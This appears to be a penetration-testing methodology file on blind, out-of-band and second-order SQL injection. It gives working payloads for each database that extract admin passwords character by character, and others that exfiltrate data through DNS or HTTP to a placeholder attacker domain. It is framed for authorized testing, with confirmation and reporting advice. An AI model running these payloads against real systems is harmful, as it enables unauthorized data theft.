# Blind, OAST, and Second-Order Extraction

## Boolean-blind character extraction

When there's no UNION-reflected column and no usable error text, but a true/false oracle exists (from the boolean test in `detection-and-fingerprinting.md`), extract data one character at a time using `SUBSTRING`/`ASCII`/`LENGTH`:

```
-- Find the length first
' AND LENGTH((SELECT password FROM users WHERE username='admin'))=10--

-- Then extract character by character (binary search on ASCII value
-- is far faster than trying every character linearly)
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE
   username='admin'),1,1))>109--
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE
   username='admin'),1,1))=109--
```
Automate this — sqlmap's `--technique=B` or a small custom script doing binary search per character is standard; doing this fully by hand beyond a proof-of-concept few characters is not a good use of time.

## Time-based blind extraction (per DBMS)

Use when there's no visible difference at all — only response timing reveals the condition's truth value.

```
MySQL:      ' AND IF(1=1,SLEEP(5),0)--
PostgreSQL: '; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
MSSQL:      '; IF (1=1) WAITFOR DELAY '0:0:5'--
Oracle:     ' AND 1=(CASE WHEN (1=1) THEN
             dbms_pipe.receive_message(('x'),5) ELSE 1 END)--
```

**SQLite has no native sleep function at all** — the standard workaround is forcing expensive computation instead of an explicit delay, e.g. a recursive query or large randomblob/hex operation sized to take a measurable number of seconds. Calibrate the iteration count against the target first (time a known-true and known-false run), since the actual delay depends heavily on server hardware — this technique is inherently noisier than a real sleep() call.

**Always run a control comparison** — true-condition and false-condition payloads, several trials each — before treating any timing result as confirmed; see the validation gate in `SKILL.md`.

## OAST (out-of-band) per DBMS

Essential when the application gives no visible signal at all (e.g., the query result is used only internally, never rendered or timed in a way you can observe). Each engine has a different native primitive for making the database itself issue an outbound DNS/HTTP request.

**MSSQL — xp_dirtree**, lists a UNC path, forcing DNS resolution of the hostname portion first; works even when `xp_cmdshell` is disabled, since `xp_dirtree` is enabled by default in many configurations:
```
'; EXEC master..xp_dirtree '\\'+(SELECT @@version)+'.YOUR-OAST-DOMAIN\a'--
```

**Oracle — UTL_HTTP** for direct outbound HTTP, or, when UTL_HTTP's ACL is restricted, an XXE-via-EXTRACTVALUE technique that forces external entity resolution over HTTP instead:
```
SELECT UTL_HTTP.REQUEST('http://'||(SELECT user FROM dual)||'.YOUR-OAST-DOMAIN/') FROM dual;

SELECT EXTRACTVALUE(xmltype('<!DOCTYPE r [<!ENTITY % p SYSTEM "http://'||(SELECT user FROM dual)||'.YOUR-OAST-DOMAIN/">%p;]>'),'/l') FROM dual;
```

**MySQL — LOAD_FILE with a UNC path** (Windows-hosted MySQL only; also requires `secure_file_priv` to be set to an empty string, which is often not the default):
```
AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.YOUR-OAST-DOMAIN\\a')))
```

**PostgreSQL — dblink** (if the extension is installed) to open an outbound connection, or `COPY ... FROM PROGRAM` to shell out to `nslookup`/`curl` directly (see `waf-bypass-and-rce-chains.md` for the COPY...PROGRAM RCE angle specifically):
```
SELECT dblink_connect('host=YOUR-OAST-DOMAIN dbname=x user=x password=x');
```

**SQLite** has no native outbound network primitive at all — OAST is effectively unavailable unless the host application has registered a custom extension/function that performs network I/O.

## DNS exfiltration: respect the length limits

DNS labels are capped at 63 characters and a full hostname at roughly 253 — encode and chunk data before embedding it, the same way you would for OAST-based command injection or NoSQL injection exfiltration. Take the extracted value, base32-encode it (avoids characters DNS labels can't safely carry), and split it into multiple sequential lookups if it doesn't fit in one label. A real, disclosed second-order SQLi report against a report-export feature hit exactly this limit in practice: exfiltrating values containing spaces or longer strings via `xp_dirtree` failed until the payload was restructured to stay within the per-label length budget and avoid characters that don't survive DNS hostname rules — if your OAST exfiltration "isn't arriving," check length and character-set constraints before assuming the technique itself failed.

## Second-order SQL injection

**The pattern:** a value is stored safely (often correctly escaped) at the point of input, but later read back and placed into a *different* SQL statement — in a different feature, a different code path, sometimes a different application entirely — that doesn't apply the same safe handling. The classic example: a registration form's username field is properly parameterized on insert, but an admin "view all users" report, or a scheduled batch job, builds a raw query string using that same stored username with no parameterization.

**Detection approach:**
```
1. Identify every feature that stores user-controlled data: profile
   fields, usernames, addresses, free-text notes, anything with a
   "save" action.
2. Identify every feature that later reads that same data back and
   uses it in a further operation: admin dashboards, reports,
   exports, search-index rebuilds, notification/email templates,
   audit logs, scheduled jobs.
3. Store a value containing injection syntax in step 1 (start with a
   simple, distinguishable marker plus a boolean/time payload, not
   destructive syntax).
4. Trigger the step-2 operation and check whether the injection's
   effect (a boolean difference, a time delay, an OAST callback)
   appears specifically at that later point — not at the original
   save operation, which may behave completely normally.
```

**Why this matters disproportionately for severity:** a second-order injection point is often reachable only by an account that can later trigger the second operation (frequently an admin), which can make this look like it "requires admin access" and therefore seems lower-impact — but the actual attack direction is usually the opposite: a low-privilege user plants the payload, and it executes when an *administrator* (higher-privilege account) triggers the second operation, meaning the attacker needed no special access at all while the impact lands in a higher-trust context. State this direction explicitly in your report; it's easy for a triager to misread severity in the wrong direction if it isn't spelled out.

**Confirming, not just observing:** the injection's effect must be demonstrated specifically at the second operation, with its own independent proof (its own boolean signal, its own timing control comparison, or its own OAST interaction) — a stored value merely containing SQL-looking characters, with no confirmed effect anywhere, is not yet a finding.
